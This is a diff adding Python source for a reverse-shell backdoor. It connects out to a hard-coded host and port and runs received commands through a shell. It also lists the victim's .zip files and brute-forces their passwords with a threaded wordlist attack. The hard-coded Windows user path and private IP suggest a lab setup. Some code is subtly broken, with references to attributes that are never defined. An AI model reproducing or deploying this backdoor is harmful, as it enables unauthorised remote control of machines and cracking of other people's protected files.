@@ -1,0 +1,177 @@
+import socket
+import zipfile
+import os
+import time
+import pickle
+import subprocess
+import getpass
+import inspect
+from functools import wraps
+import queue
+import threading
+import signal
+
+def check_file(zip_file=None, word_list=None):
+	combine_dir = None
+	for root, dirs, files in os.walk("C://Users/IEUser"):
+		for file in files:
+			if zip_file:
+				if file == zip_file:
+					combine_dir = root + "/" + zip_file
+					if not zipfile.is_zipfile(combine_dir):
+						return False
+			if word_list:
+				if file == word_list:
+					combine_dir = root + "/" + word_list
+					if not os.path.isfile(combine_dir):
+						return False
+	return combine_dir
+
+def verify_files(function):
+	@wraps(function)
+	def inside(zip_file, word_list):
+		check_zip = check_file(zip_file=zip_file)
+		check_word_list = check_file(word_list=word_list)
+		if not check_zip or not check_word_list:
+			return
+		return function(check_zip, check_word_list)
+	return inside
+
+@verify_files
+class ZipFile:
+	def __init__(self, zip_file, word_list):
+		self.zip_file = zip_file
+		self.word_list = word_list
+		self.q = queue.Queue(maxsize=50)
+		self.end_thread = False
+		self.password = ""
+
+	def word_list_brute(self):
+		with open(self.word_list, "r") as f:
+			data = f.readlines()
+
+		for password in data:
+			password = password.strip()
+			yield password
+
+	def extract_zip_file(self, zip_file, password):
+		password = password.encode()
+		try:
+			zip_file.extractall(pwd=password)
+			self.password = password.decode()
+			self.end_thread = True
+			return
+		except Exception:
+			pass
+
+	def brute_force_zip(self):
+		get_word_list = self.word_list_brute()
+		count = 0
+		get_zip_file = zipfile.ZipFile(self.zip_file)
+		print("[+] Starting\n")
+
+		for password in get_word_list:
+			self.q.put(password)
+			if self.q.qsize() == 50:
+				while not self.q.empty():
+					thread = threading.Thread(target=self.extract_zip_file, args=(get_zip_file, self.q.get()), daemon=True)
+					thread.start()
+					count += 1
+					print(f"\rAttempts: {str(count)}", flush=True, end="")
+
+					if self.q.empty():
+						with self.q.mutex:
+							self.queue.clear()
+							continue
+
+					if self.end_thread:
+						return f"[+] Got password -> {self.password}"
+		return f"[-] Couldn't get password with {str(count)} attempts"
+
+
+class Socket:
+	def __init__(self):
+		self.get_dict = self.dict_arguments()
+		self.ip = "10.0.2.15"
+		self.port = 5655
+		self.socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+		print("[+] Waiting for a connection")
+		while self.socket_connection.connect_ex((self.ip, self.port)) != 0:
+			time.sleep(5)
+
+		self.start_connection()
+
+	def reliable_send(self, data):
+		if isinstance(data, list):
+			data_list = pickle.dumps(data)
+		else:
+			data_list = data
+			data_list = data_list.encode()
+		self.connection.send(data_list)
+
+	def victim_username(self):
+		return getpass.getuser()
+
+	def print_current_directory(self):
+		return os.getcwd()
+
+	def change_directory(self, directory):
+		os.chdir(directory[1])
+		return os.getcwd()
+
+	def check_zip_file(self):
+		my_list = []
+		username = self.victim_username()
+		for root, dirs, files in os.walk(f"C://Users/{username}"):
+			for file in files:
+				if file.endswith(".zip"):
+					combine_file = os.path.join(root, file)
+					my_list.append(combine_file)
+		return my_list
+
+	def check_output(self, command):
+		return subprocess.check_output(command, shell=True).decode()
+
+	def brute_force_zip_file(self, password):
+		start_brute = ZipFile(password[1], password[2])
+		if not hasattr(start_brute, 'zip_file') or not hasattr(start_brute, 'word_list'):
+			return f"[-] Invalid File {password[1]} : {password[2]}"
+		return start_brute.brute_force_zip()
+
+	def dict_arguments(self):
+		return {
+			"scan-zip": self.check_zip_file,
+			"cd": self.change_directory,
+			"listdir": self.print_current_directory,
+			"clear": self.clear,
+			"brute": self.brute_force_zip_file
+		}
+
+	def get_dict_args(self, data, *args):
+		return self.get_dict[data](*args)
+
+	def clear(self):
+		return "[+] Cleared"
+
+	def start_connection(self):
+		print("[+] Connected")  
+
+		while True:
+			try:
+				data = pickle.loads(self.socket_connection.recv(4096))
+				if data[0] in self.get_dict:
+					if len(inspect.getfullargspec(self.get_dict[data[0]])[0]) > 1:
+						command = self.get_dict_args(data[0], data)
+					else:
+						command = self.get_dict_args(data[0])
+				else:
+					command = self.check_output(data)
+			except Exception:
+				command = "[!] Error"
+			self.reliable_send(command)
+
+
+if __name__ == '__main__':
+	Socket()
